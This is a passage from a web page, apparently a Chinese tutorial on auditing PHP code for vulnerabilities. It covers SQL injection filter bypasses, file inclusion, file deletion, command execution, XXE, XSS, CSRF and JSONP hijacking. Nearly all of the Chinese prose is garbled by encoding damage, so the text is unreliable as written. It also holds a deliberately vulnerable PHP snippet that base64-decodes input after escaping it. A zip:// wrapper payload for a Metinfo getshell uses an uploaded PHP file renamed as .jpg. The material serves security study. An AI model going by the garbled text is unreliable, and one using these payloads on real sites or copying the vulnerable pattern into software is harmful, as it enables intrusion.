2. ä¼ é€’çš„è¿‡ç¨‹ä¸­è§¦å‘æ¼æ´</p>
<p>ç‰¹ç‚¹ï¼š</p>
<ol>
<li>ä¸ä¸Šä¸‹æ–‡æ— å…³</li>
<li>å±é™©å‡½æ•°ï¼Œè°ƒç”¨å³æ¼æ´</li>
</ol>
<p>ä»£ç å®¡è®¡å·¥å…·åŠŸèƒ½å¤§å¤šå°±æ˜¯è¿™ä¸ªåŸç†</p>
<h3 id="åŒå‘æŸ¥æ‰¾æµç¨‹ï¼ˆæ‰‹åŠ¨å®¡è®¡ä¸»è¦æ–¹å¼ï¼‰"><a class="header-anchor" href="#åŒå‘æŸ¥æ‰¾æµç¨‹ï¼ˆæ‰‹åŠ¨å®¡è®¡ä¸»è¦æ–¹å¼ï¼‰">Â¶</a>åŒå‘æŸ¥æ‰¾æµç¨‹ï¼ˆæ‰‹åŠ¨å®¡è®¡ä¸»è¦æ–¹å¼ï¼‰</h3>
<ol>
<li>ç•¥è¯»ä»£ç ï¼Œäº†è§£æ¡†æ¶ï¼ˆæ­£å‘æµç¨‹ï¼Œå¦‚ï¼šç½‘ç«™éƒ½æœ‰å“ªäº›åŠŸèƒ½ï¼Œä»€ä¹ˆæ ·çš„æ¶æ„å¦‚mvcï¼šå®ƒçš„måœ¨å“ªv,cåœ¨å“ªï¼Œç”¨äº†ä»€ä¹ˆæ¨¡æ¿å¼•æ“ï¼Œæ˜¯å¦ç”¨äº†ormï¼ˆå¦‚æœä½¿ç”¨äº†ORMé‚£ä¹ˆsqlæ³¨å…¥å°±å¾ˆå°‘äº†ï¼Œå¦‚æœæ²¡ç”¨æ˜¯æ‰‹å·¥å†™çš„sqlè¯­å¥ï¼Œå¯ä»¥å…³æ³¨æ˜¯å¦å­˜åœ¨sqlæ¼æ´ï¼‰ç­‰â€¦)</li>
<li>æ˜¯å¦æœ‰å…¨å±€è¿‡æ»¤æœºåˆ¶
<ol>
<li>æœ‰ï¼šæ˜¯å¦å¯ä»¥ç»•è¿‡
<ol>
<li>å¯ä»¥ï¼šå¯»æ‰¾æ¼æ´è§¦å‘ç‚¹ï¼ˆåå‘æŸ¥æ‰¾æµç¨‹ï¼Œæ‰¾å±é™©å‡½æ•°ï¼‰</li>
<li>ä¸å¯ä»¥ï¼šå¯»æ‰¾æ²¡æœ‰è¿‡æ»¤çš„å˜é‡</li>
</ol>
</li>
<li>æ²¡æœ‰ï¼šé‚£ä¹ˆå°±çœ‹å®ƒå…·ä½“æ˜¯å¦‚ä½•å¤„ç†çš„,å…·ä½“ä»£ç å…·ä½“åˆ†æ
<ol>
<li>æœ‰å¤„ç†ï¼šå¯»æ‰¾é—æ¼çš„å¤„ç†ç‚¹ï¼ˆå¦‚å¿˜è®°å¤„ç†çš„åœ°æ–¹æˆ–è€…å¤„ç†ä¸å¤ªæ­£ç¡®çš„åœ°æ–¹ï¼‰</li>
<li>å®Œå…¨æ²¡æœ‰å¤„ç†ï¼šå¯ä»¥æŒ–æˆç­›å­ï¼ˆå¾ˆå°‘ï¼‰</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>3.æ‰¾åˆ°äº†æ¼æ´ç‚¹ï¼Œæ¼æ´åˆ©ç”¨æ˜¯å¦æœ‰å‘</p>
<p>æ ¹æºï¼šç†è§£ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ï¼Œæ‰¾å¯»å±é™©é€»è¾‘<br>
ç‰¹ç‚¹ï¼š<br>
é«˜æ•ˆï¼šå¦‚æŒ–éš§é“ï¼ŒåŒå‘å¼€å·¥ï¼Œæ—¶é—´å‡åŠï¼ˆä¸éœ€è¦å»å®Œå…¨ç†è§£ç½‘ç«™å†…éƒ¨åŸç†å’Œå‡½æ•°ä½œç”¨)<br>
çŸ¥è¯†é¢å¹¿ï¼šéœ€è¦åŒæ—¶æŒæ¡æ­£å‘ï¼Œåå‘æŒ–æ˜æŠ€å·§ï¼Œå¹¶è¿›è¡Œç»“åˆ<br>
ä»¥åŠæ‰€æœ‰æ­£å‘ï¼Œåå‘çš„ä¼˜ç‚¹</p>
<h2 id="SQLæ³¨å…¥æ¼æ´æŒ–æ˜æŠ€å·§"><a class="header-anchor" href="#SQLæ³¨å…¥æ¼æ´æŒ–æ˜æŠ€å·§">Â¶</a>SQLæ³¨å…¥æ¼æ´æŒ–æ˜æŠ€å·§</h2>
<p>PHP+mysqlé“¾æ¥æ–¹å¼æœ‰ï¼š<br>
mysqlï¼ˆåºŸå¼ƒï¼Œä½†è€çš„ä»ç„¶æœ‰ï¼‰<br>
mysqli<br>
PDO</p>
<h3 id="sqlæ³¨å…¥å¸¸è§è¿‡æ»¤æ–¹æ³•ï¼š"><a class="header-anchor" href="#sqlæ³¨å…¥å¸¸è§è¿‡æ»¤æ–¹æ³•ï¼š">Â¶</a>sqlæ³¨å…¥å¸¸è§è¿‡æ»¤æ–¹æ³•ï¼š</h3>
<p><strong>intvalï¼š</strong>							æŠŠç”¨æˆ·è¾“å…¥çš„æ•°å­—åé¢çš„æ‰€æœ‰ä¸æ˜¯æ•°å­—çš„éƒ½è¿‡æ»¤æ‰<br>
<strong>addslashesï¼š</strong>				  æŠŠ â€™ å‰åŠ \è½¬ä¹‰æ‰<br>
<strong>mysql_real_escapeï¼š</strong>	å’Œç¬¬äºŒä¸ªç±»ä¼¼ï¼Œä½†ä¼šè€ƒè™‘ç”¨æˆ·è¾“å…¥å’Œmysqlçš„ç¼–ç ï¼Œé¿å…åƒå®½å­—èŠ‚æ³¨å…¥é—®é¢˜</p>
<p><strong>mysqli_escape_string</strong> / <strong>mysqli_real_escape_string</strong> / <strong>mysqli::escape_string</strong>  ï¼ˆå’Œmysqliæ­é…ä½¿ç”¨ï¼Œå’Œå‰é¢çš„åŠŸèƒ½ç±»ä¼¼ï¼‰å’Œä»–ä»¬çš„å·®åˆ«æ˜¯ä¼šä¸»åŠ¨åŠ å¼•å·åŒ…è£¹</p>
<p><strong>PDO:</strong>	quote</p>
<p><strong>å‚æ•°åŒ–æŸ¥è¯¢</strong></p>
<h3 id="å¸¸è§æ³¨å…¥è¿‡æ»¤ç»•è¿‡æ–¹æ³•ï¼š"><a class="header-anchor" href="#å¸¸è§æ³¨å…¥è¿‡æ»¤ç»•è¿‡æ–¹æ³•ï¼š">Â¶</a>å¸¸è§æ³¨å…¥è¿‡æ»¤ç»•è¿‡æ–¹æ³•ï¼š</h3>
<p>intvalï¼šä¸çŸ¥é“<br>
addslashes  /  mysql_real_escape<br>
1.å®½å­—èŠ‚æ³¨å…¥<br>
2.æ•°å­—å‹sqlè¯­å¥<br>
3.å¯»æ‰¾å­—ç¬¦ä¸²è½¬æ¢å‡½æ•°ï¼ˆä¼ å…¥ç¼–ç å¥½çš„å­—ç¬¦ç»•è¿‡è¿‡æ»¤ï¼Œåœ¨åé¢è¢«è½¬æ¢æˆsqlè¯­å¥ï¼‰<br>
urldecode<br>
base64_decode<br>
iconv<br>
json_decode<br>
stripshasles<br>
simple_xml_loadstring<br>
ä¾‹å¦‚ï¼šä¼ å…¥idè¢«è¿‡æ»¤ä½†åé¢æœ‰ä¸€å¤„ä»£ç æ˜¯è§£ç base64ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥ â€™ çš„base64ç¼–ç ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">....</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>);</span><br><span class="line">....</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from flag where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>mysqli::escape_string  //  PDO::quote<br>
1.å®½å­—èŠ‚æ³¨å…¥<br>
å‚æ•°åŒ–æŸ¥è¯¢<br>
1.å¯»æ‰¾ésqlå€¼çš„ä½ç½®</p>
<h3 id="å¼€å‘è€…å®¹æ˜“é—æ¼å¾—è¾“å…¥ç‚¹"><a class="header-anchor" href="#å¼€å‘è€…å®¹æ˜“é—æ¼å¾—è¾“å…¥ç‚¹">Â¶</a>å¼€å‘è€…å®¹æ˜“é—æ¼å¾—è¾“å…¥ç‚¹</h3>
<ol>
<li>
<p>HTTPå¤´</p>
<p>a. X-Forwarded-For</p>
<p>b. User-Agent</p>
<p>c. Referer</p>
</li>
<li>
<p>PHP_SELFï¼ˆè®¿é—®çš„é¡µé¢urlåï¼Œä½†ç”¨æˆ·å¯æ§ï¼‰</p>
</li>
<li>
<p>REQUEST_URIï¼ˆç”¨æˆ·è¯·æ±‚å¾—å®Œæ•´è·¯å¾„ï¼‰</p>
</li>
<li>
<p>æ–‡ä»¶å $_FILES[][name]</p>
</li>
<li>
<p>php://input   (postç©¿è¿›å»å¾—å†…å®¹)</p>
</li>
</ol>
<p>å¼•å…¥å•å¼•å·(è½¬ä¹‰ç¬¦)çš„æ–¹æ³•ï¼ˆâ€˜å·è¢«è¿‡æ»¤ï¼Œçœ‹åé¢æœ‰æ²¡æœ‰å¯ä»¥å¼•å…¥çš„åœ°æ–¹ï¼‰<br>
stripslashes<br>
base64_decode<br>
urldecode<br>
substr<br>
iconv<br>
str_replace(â€˜0â€™,â€™',$sql)<br>
xml<br>
json_encode</p>
<h2 id="ä»»æ„æ–‡ä»¶æ“ä½œ"><a class="header-anchor" href="#ä»»æ„æ–‡ä»¶æ“ä½œ">Â¶</a>ä»»æ„æ–‡ä»¶æ“ä½œ</h2>
<p>PHPä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«ä¿å­˜åœ¨$_FILESä¸‹</p>
<p>PHPæ–‡ä»¶æ“ä½œå‡½æ•°æ±‡æ€»</p>
<ol>
<li>æ–‡ä»¶åŒ…å«
<ol>
<li>include/require/include_once/require_once/spl_autoload</li>
</ol>
</li>
<li>æ–‡ä»¶è¯»å–
<ol>
<li>file_get_contents/fread/readfile/file/ highlight_file/show_source</li>
</ol>
</li>
<li>æ–‡ä»¶å†™å…¥
<ol>
<li>file_put_contents/fwrite/mkdir/fputs</li>
</ol>
</li>
<li>æ–‡ä»¶åˆ é™¤
<ol>
<li>unlink/rmdir</li>
</ol>
</li>
<li>æ–‡ä»¶ä¸Šä¼ 
<ol>
<li>move_uploaded_file/copy/rename</li>
</ol>
</li>
</ol>
<h3 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a class="header-anchor" href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´">Â¶</a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3>
<p>æ–‡ä»¶ä¸Šä¼ æµç¨‹ï¼š</p>
<ol>
<li>
<p>æ£€æŸ¥æ–‡ä»¶å¤§å°ï¼Œåç¼€ï¼Œç±»å‹</p>
</li>
<li>
<p>æ£€æŸ¥æ–‡ä»¶å†…å®¹ï¼ˆå¦‚æ–‡ä»¶å¤´ï¼Œå°¾ç­‰ï¼‰</p>
</li>
<li>
<p>æå–æ–‡ä»¶åç¼€</p>
</li>
<li>
<p>ç”Ÿæˆæ–°æ–‡ä»¶å</p>
</li>
<li>
<p>å°†ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶æ‹·è´åˆ°æ–°æ–‡ä»¶åä½ç½®</p>
</li>
</ol>
<p>æ–‡ä»¶ä¸Šä¼ é€»è¾‘å¸¸è§é”™è¯¯</p>
<ol>
<li>åªæ£€æŸ¥æ–‡ä»¶ç±»å‹ä¸æ£€æŸ¥æ–‡ä»¶åç¼€</li>
<li>æ–‡ä»¶åç¼€é»‘åå•æœ‰é—æ¼</li>
<li>ä½¿ç”¨åŸå§‹æ–‡ä»¶åï¼Œå¯¼è‡´\0æˆªæ–­ï¼ˆä¸€èˆ¬æ²¡æœ‰äº†ï¼‰</li>
<li>å‰ç«¯æ£€éªŒ</li>
</ol>
<h3 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a class="header-anchor" href="#æ–‡ä»¶åŒ…å«æ¼æ´">Â¶</a>æ–‡ä»¶åŒ…å«æ¼æ´</h3>
<p>é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ä¸ç­‰äºæ–‡ä»¶è¯»å–æ¼æ´</p>
<p>å±å®³ï¼šæ–‡ä»¶è¯»å–  /  ä»£ç æ‰§è¡Œ<br>
å¸¸è§ä½ç½®ï¼šæ¨¡æ¿æ–‡ä»¶åï¼ˆåˆ‡æ¢æ¨¡æ¿ï¼‰<br>
è¯­è¨€æ–‡ä»¶åï¼ˆåˆ‡æ¢è¯­è¨€ï¼‰<br>
å¸¸è§åˆ©ç”¨ï¼š<br>
è¦å¯»æ‰¾å¯è¢«åŒ…å«åˆ©ç”¨çš„æ–‡ä»¶ï¼šä¸Šä¼ æ–‡ä»¶ï¼Œä¸´æ—¶æ–‡ä»¶ï¼ŒSessionæ–‡ä»¶ï¼Œæ—¥å¿—æ–‡ä»¶<br>
åç¼€æ— æ³•æ§åˆ¶çš„æƒ…å†µï¼š\0æˆªæ–­ï¼Œåè®®åˆ©ç”¨<br>
PHP5.3.4+ å¯¹åŒ…å«\0çš„æ–‡ä»¶æ“ä½œå‡½æ•°è¿›è¡Œäº†é™åˆ¶ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰äº†</p>
<h4 id="æ¡ˆä¾‹ï¼š"><a class="header-anchor" href="#æ¡ˆä¾‹ï¼š">Â¶</a>æ¡ˆä¾‹ï¼š</h4>
<p>Metinfo 5.3.10ç‰ˆæœ¬Getshellæ¼æ´<br>
å¯æ§åˆ¶çš„éƒ¨åˆ†ï¼šinclude $file . â€˜.phpâ€™;<br>
httpåè®®åˆ©ç”¨ï¼š<a target="_blank" rel="noopener" href="http://xxxx.com/1.php">http://xxxx.com/1.php</a> (è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œä¸€èˆ¬ä¸å¼€è®¾ç½®ä¸èƒ½ç”¨)<br>
PHPåè®®åˆ©ç”¨ï¼šzip/phar<br>
åˆ¶ä½œ2.phpçš„å‹ç¼©åŒ… -&gt; 2.zip -&gt; æ”¹åç¼€ä¸º -&gt; 2.jpg<br>
åœ¨æœåŠ¡å™¨ä¸­ä¸Šä¼ 2.jpgæ–‡ä»¶<br>
å†åˆ©ç”¨ï¼šzip://var/www/upload/head/2.jpg#2.php ï¼ˆ#æ„æ€æ˜¯è®¿é—®zipå†…éƒ¨çš„å­æ–‡ä»¶-&gt;2.phpï¼‰</p>
<h3 id="æ–‡ä»¶åˆ é™¤æ¼æ´"><a class="header-anchor" href="#æ–‡ä»¶åˆ é™¤æ¼æ´">Â¶</a>æ–‡ä»¶åˆ é™¤æ¼æ´</h3>
<p>å±å®³ï¼š<br>
åˆ é™¤æœåŠ¡å™¨ä»»æ„æ–‡ä»¶ï¼ŒDOSæœåŠ¡å™¨<br>
åˆ é™¤å®‰è£…é”æ–‡ä»¶ï¼Œå¯¼è‡´ç›®æ ‡ç¯å¢ƒå¯è¢«é‡æ–°å®‰è£…<br>
é‡æ–°å®‰è£…  -ã€‹ä»»æ„é‡ç½®ç®¡ç†å‘˜å¯†ç </p>
<h4 id="æ¡ˆä¾‹"><a class="header-anchor" href="#æ¡ˆä¾‹">Â¶</a>æ¡ˆä¾‹</h4>
<p>ä¸Šä¼ æ–°å¤´åƒä¼šæŠŠè€å¤´åƒè‡ªåŠ¨åˆ é™¤ï¼Œä½†å¯ä»¥æŠŠåˆ é™¤è€å›¾åƒçš„åœ°å€æ¢æˆåˆ«çš„é€ æˆä»»æ„æ–‡ä»¶åˆ é™¤</p>
<h2 id="å‘½ä»¤æ‰§è¡Œ"><a class="header-anchor" href="#å‘½ä»¤æ‰§è¡Œ">Â¶</a>å‘½ä»¤æ‰§è¡Œ</h2>
<p>å‘½ä»¤æ‰§è¡ŒæŒ‡çš„æ˜¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ ï¼ˆlsï¼‰<br>
å¯ä»¥åœ¨è¿™ä¸ªç½‘ç«™æŸ¥è¯¢å¤åˆ¶å‘½ä»¤çš„æ„æ€<br>
ä»£ç æ‰§è¡ŒæŒ‡çš„æ˜¯PHPçš„ä»£ç æ‰§è¡Œ<br>
æœ¬è´¨ï¼šç”¨æˆ·è¾“å…¥æ— è¿‡æ»¤ï¼Œæ‹¼æ¥åˆ°äº†ç³»ç»Ÿå‘½ä»¤ä¸­<br>
PHPå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</p>
<ol>
<li>system</li>
<li>passthru</li>
<li>exec</li>
<li>shell_exec</li>
<li>popen  (å¸¸è§çš„å°±æ˜¯ä¸Šé¢è¿™5ç§)</li>
<li>proc_open</li>
<li>pcntl_exec</li>
<li>dl</li>
</ol>
<p>è¦åƒå‘½ä»¤æ‰§è¡Œå¾ˆéš¾ï¼Œè¦å…ˆå­¦ä¼šå¦‚ä½•æ­£ç¡®é˜²å¾¡å‘½ä»¤æ³¨å…¥ï¼Œæ‰èƒ½åˆ†è¾¨å‡ºå“ªäº›æ²¡æœ‰æ­£ç¡®å¤„ç†</p>
<p>é˜²å¾¡PHPå‘½ä»¤æ³¨å…¥æ¼æ´ï¼š<br>
PHPä¸­åªèƒ½ä½¿ç”¨escapeshellcmdå’Œescapeshellatgè¿›è¡Œå‘½ä»¤å‚æ•°çš„è¿‡æ»¤</p>
<ol>
<li>å…ˆåŒºåˆ†è¿™2ä¸ªå‡½æ•°ï¼š</li>
</ol>
<p>â€‹		<strong>escapeshellcmd</strong><br>
â€‹		<strong>escapeshellatg</strong><br>
â€‹				escapeshellatgæ²¡é—®é¢˜ä½†escapeshellatgæ˜¯åªèƒ½é™åˆ¶é€ƒé€¸ä¸å‡ºå•å¼•å·â€™ä½†æœ‰äº›å‘½ä»¤çš„ä¸å¸¸ç”¨å‚æ•°æ˜¯å¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<ol start="2">
<li>è¦æŠŠç”¨æˆ·çš„è¾“å…¥æ”¾åœ¨å€¼é‡Œ</li>
</ol>
<p>â€‹	å¦‚æœæŠŠè¾“å…¥ç›´æ¥æ˜¯é”®å€¼å¯¹å¯èƒ½ä¼šé€ æˆæ¼æ´</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &#123;$query&#125;</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸€äº›å‘½ä»¤çš„ä¸å¸¸ç”¨å‚æ•°å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ„å¤–æ¯”ã€‚ç›´æ¥ä½¿ç”¨ | ç­‰å‘½ä»¤è·³å‡ºå‰é¢çš„å‘½ä»¤å®ç°å‘½ä»¤æ‰§è¡Œ<br>
â€‹	ä¿®å¤ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -i &#123;$query&#125;</span><br><span class="line">grep -- &#123;$query&#125;</span><br></pre></td></tr></table></figure>
<h2 id="XMLå®ä½“æ³¨å…¥æ¼æ´"><a class="header-anchor" href="#XMLå®ä½“æ³¨å…¥æ¼æ´">Â¶</a>XMLå®ä½“æ³¨å…¥æ¼æ´</h2>
<p>PHP XMLè§£æå‡½æ•°<br>
simplexml_load_file<br>
simplexml_load_string<br>
SimpleXMLElement<br>
DOMDocument<br>
xml_parse<br>
å¦‚æœå‘ç°æœ‰è¿™å‡ ä¸ªå‡½æ•°çš„åœ°æ–¹ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šç™¾åˆ†ä¹‹80æœ‰xmlå®ä½“æ³¨å…¥</p>
<p>libxml_disable_entity_loader(true)æ¥ç¦ç”¨æ‰å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå°±ä¸å­˜åœ¨xmlå®ä½“æ³¨å…¥</p>
<p>PHPä¸­XXEæ¼æ´é€æ¸å‡å°‘ï¼Œåˆ°ç°åœ¨çš„ç‰ˆæœ¬é‡Œå‡ ä¹å·²ç»ç»è¿¹äº†ï¼Œå› ä¸ºPHP XMLæ“ä½œä¾èµ–libxmlåº“<br>
ä½†åœ¨libxml2.9.0+é»˜è®¤æ˜¯å…³é—­äº†xmlå¤–éƒ¨å®ä½“è§£æå¼€å…³çš„ï¼Œå¯ä»¥é¡ºåŠ¿æŒ–ä¸€ä¸‹ä¹Ÿæ¯”è¾ƒç®€å•</p>
<p>æ–¹æ³•ï¼šæš´åŠ›æœç´¢å°±è¡Œï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰xmlè§£æå‡½æ•°ï¼Œå†çœ‹ç¦æ²¡ç¦æ­¢å¤–éƒ¨åŠ è½½</p>
<p>æ— è¾“å‡ºç‚¹çš„xxeæ¼æ´ï¼šæœ‰æ—¶å€™å¯èƒ½å­˜åœ¨xxeæ¼æ´ä½†å¹¶ä¸ä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤ºï¼Œè¦åˆ©ç”¨åˆ°blind-xxe<br>
Blind XXEåŸç†ï¼š<br>
åˆ©ç”¨XMLå¤–éƒ¨å®ä½“åŠŸèƒ½è¯»å–æ–‡ä»¶<br>
åˆ©ç”¨XMLå¤–éƒ¨å®ä½“åŠŸèƒ½å‘é€HTTPè¯·æ±‚<br>
åˆ©ç”¨HTTPåè®®ä¼ é€’æ–‡ä»¶å†…å®¹</p>
<h2 id="å‰ç«¯æ¼æ´ï¼š"><a class="header-anchor" href="#å‰ç«¯æ¼æ´ï¼š">Â¶</a>å‰ç«¯æ¼æ´ï¼š</h2>
<p>å»ºè®®ä»£ç å®¡è®¡ä¸å»ä¸»è¦æ‰¾è¿™ç§æ¼æ´ï¼Œè¿›è¡Œé»‘ç›’æµ‹è¯•å°±èƒ½æŒ–åˆ°çš„æ¼æ´ï¼Œåœ¨ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­æ²¡å¿…è¦å¤ªæ³¨é‡</p>
<p>ç™¾ç›’æµ‹è¯•ä¸­å¯ä»¥å…³æ³¨å‰ç«¯æ¼æ´ç±»å‹ï¼š<br>
XSSæ¼æ´<br>
CSRFæ¼æ´<br>
JsonpåŠ«æŒæ¼æ´ï¼ˆå‰é¢ä¸‰ä¸ªå…³æ³¨å¤šï¼‰<br>
URLè·³è½¬æ¼æ´ï¼ˆä¸å¤šï¼‰<br>
ç‚¹å‡»åŠ«æŒæ¼æ´ï¼ˆä¸å¤šï¼‰</p>
<h3 id="xss"><a class="header-anchor" href="#xss">Â¶</a>xss</h3>
<p>åœ¨ç™½ç›’æµ‹è¯•ä¸­å¯»æ‰¾XSSæ¼æ´ï¼š<br>
å¸¸è§é˜²æŠ¤æ–¹æ³•ï¼š<br>
htmlspecialchars()æŠŠç”¨æˆ·è¾“å…¥è½¬ä¹‰æˆhtmlå®ä½“å­—ç¬¦ï¼ˆè¿™æ—¶å€™æ˜¯ç»å¯¹æ²¡æœ‰xssçš„ï¼‰<br>
strip_tags()	ä»å­—ç¬¦ä¸­å»é™¤HTMLå’ŒPHPæ ‡è®°</p>
<p>è‡ªåŠ¨åŒ–FUZZ -ã€‹å¯»æ‰¾è¾“å‡ºå‡½æ•°ï¼ˆå±é™©å‡½æ•°ï¼‰<br>
å¯Œæ–‡æœ¬XSSæŒ–æ˜<br>
ä»€ä¹ˆæ˜¯å¯Œæ–‡æœ¬ï¼šæœ¬è´¨å°±æ˜¯htmlï¼Œç½‘ç«™ç»™ä½ ä¸€ä¸ªæœ‰å¾ˆå¤šåŠŸèƒ½çš„è¾“å…¥æ¡†</p>
<p><img src="https://static.sechelper.com/img/2022/11/22/773b4680008c6372db041770fbff4669.png" alt="image.png"><br>
ä¸ºä»€ä¹ˆå‡ºç°å¯Œæ–‡æœ¬xssï¼š<br>
å‰é¢2ç§é˜²æŠ¤æ–¹æ³•è¦ä¹ˆå°±æ˜¯è½¬ä¹‰æ‰è¦ä¹ˆå°±æ˜¯ç›´æ¥å»é™¤æ‰ï¼Œä½†åœ¨ä¸€äº›å†™æ–‡ç« ï¼Œæˆ–è€…å‘å¸–çš„éœ€è¦æäº¤htmlå¯Œæ–‡æœ¬ï¼Œå¦‚æœä½¿ç”¨å‰é¢çš„æ–¹æ³•é‚£ä¹ˆæäº¤çš„å°±ä¸æ˜¯å¯Œæ–‡æœ¬äº†ï¼Œä¼šå½±å“ä¸šåŠ¡ã€‚<br>
å¸¸è§å¯Œæ–‡æœ¬è¿‡æ»¤æ–¹æ³•ï¼š<br>
ä¼šä½¿ç”¨å¯Œæ–‡æœ¬çš„xssè¿‡æ»¤å™¨ï¼šæŠŠç”¨æˆ·è¾“å…¥çš„æ¶æ„æ ‡ç­¾ï¼Œå±æ€§å»æ‰<br>
é»‘åå•ï¼ˆå¾ˆéš¾è¿‡æ»¤æ‰è¯¥è¿‡æ»¤çš„æ ‡ç­¾å±æ€§)<br>
ç™½åå•</p>
<h3 id="CSRF"><a class="header-anchor" href="#CSRF">Â¶</a>CSRF</h3>
<p>åœ¨ç™½ç›’æµ‹è¯•ä¸­å¯»æ‰¾CSRFæ¼æ´ï¼š<br>
æ£€æŸ¥Refererï¼ˆæ¥è‡ªäºå½“å‰åŸŸåï¼Œå¯ä¿¡åŸŸåï¼Œæ‰ä¼šæ‰§è¡Œï¼‰<br>
ï¼ˆå¯ä»¥çœ‹æ­£åˆ™åŒ¹é…å…¨é¢å—ï¼Œæ¯”å¦‚æ­£åˆ™åŒ¹é…xxx.nteåç¼€çš„åŸŸåï¼Œé‚£ä¹ˆå¯ä»¥æ³¨å†Œä¸ªcxxx.nteåŸŸåç»•è¿‡ï¼‰<br>
æ£€æŸ¥Token<br>
ï¼ˆå¯»æ‰¾è·¨åŸŸæ¼æ´ï¼Œè¦å»è·¨åŸŸè¯·æ±‚æŸä¸€ä¸ªç½‘ç«™å†…å®¹çš„æ—¶å€™éœ€è¦å…ˆå»è¯·æ±‚è¿™ä¸ªç½‘ç«™æœ‰æ²¡æœ‰crossdomain.xmlï¼Œ<br>
è¦æ ¹æ®è¿™é‡Œé¢é…ç½®çš„ä¿¡æ¯æ¥è®¤è¯æ˜¯å¦å…è®¸ç”¨æˆ·å»å‘é€ä¸€ä¸ªè·¨ç«™çš„è¯·æ±‚ï¼‰<br>
Flash<br>
Jsonp<br>
CORS   é»‘ç›’æµ‹è¯•å°±å¯ä»¥æ‰¾åˆ°è¿™ä¸‰ä¸ª</p>
<h3 id="JsonpåŠ«æŒæ¼æ´"><a class="header-anchor" href="#JsonpåŠ«æŒæ¼æ´">Â¶</a>JsonpåŠ«æŒæ¼æ´</h3>
<p>åœ¨ç™½ç›’æµ‹è¯•ä¸­å¯»æ‰¾JsonpåŠ«æŒæ¼æ´ï¼š<br>
Jsonpä»‹ç»ï¼šJsonpæ˜¯ json çš„ä¸€ç§&quot;ä½¿ç”¨æ¨¡å¼&quot;   å¯ä»¥è®©ç½‘é¡µä»åˆ«çš„åŸŸåï¼ˆç½‘ç«™ï¼‰é‚£è·å–èµ„æ–™ï¼Œå³è·¨åŸŸè¯»å–æ•°æ®ï¼›<br>
å®ƒåˆ©ç”¨çš„æ˜¯scriptæ ‡ç­¾çš„ src å±æ€§ä¸å—åŒæºç­–ç•¥å½±å“çš„ç‰¹æ€§ï¼Œä½¿ç½‘é¡µå¯ä»¥å¾—åˆ°ä»å…¶ä»–æ¥æºåŠ¨æ€äº§ç”Ÿçš„ json æ•°æ®ï¼Œå› æ­¤å¯ä»¥ç”¨æ¥å®ç°è·¨åŸŸè¯»å–æ•°æ®ã€‚<br>
æ›´é€šä¿—çš„è¯´æ³•ï¼šJSONP å°±æ˜¯åˆ©ç”¨ <script> æ ‡ç­¾çš„è·¨åŸŸèƒ½åŠ›å®ç°è·¨åŸŸæ•°æ®çš„è®¿é—®ï¼Œè¯·æ±‚åŠ¨æ€ç”Ÿæˆçš„ JavaScript è„šæœ¬åŒæ—¶å¸¦ä¸€ä¸ª callback å‡½æ•°åä½œä¸ºå‚æ•°ã€‚æœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚åï¼ŒåŠ¨æ€ç”Ÿæˆè„šæœ¬äº§ç”Ÿæ•°æ®ï¼Œå¹¶åœ¨ä»£ç ä¸­ä»¥äº§ç”Ÿçš„æ•°æ®ä¸ºå‚æ•°è°ƒç”¨ callback å‡½æ•°ã€‚</p>
<p>åŸç†ï¼šå½“ç½‘ç«™é€šè¿‡ JSONP æ–¹å¼ä¼ é€’ç”¨æˆ·æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€  JSONP è°ƒç”¨é¡µé¢ï¼Œè¯±å¯¼è¢«æ”»å‡»è€…è®¿é—®æ¥	è¾¾åˆ°çªƒå–ç”¨æˆ·ä¿¡æ¯çš„ç›®çš„ï¼›jsonp æ•°æ®åŠ«æŒå°±æ˜¯æ”»å‡»è€…è·å–äº†æœ¬åº”è¯¥ä¼ ç»™ç½‘ç«™å…¶ä»–æ¥å£çš„æ•°æ®ã€‚<br>
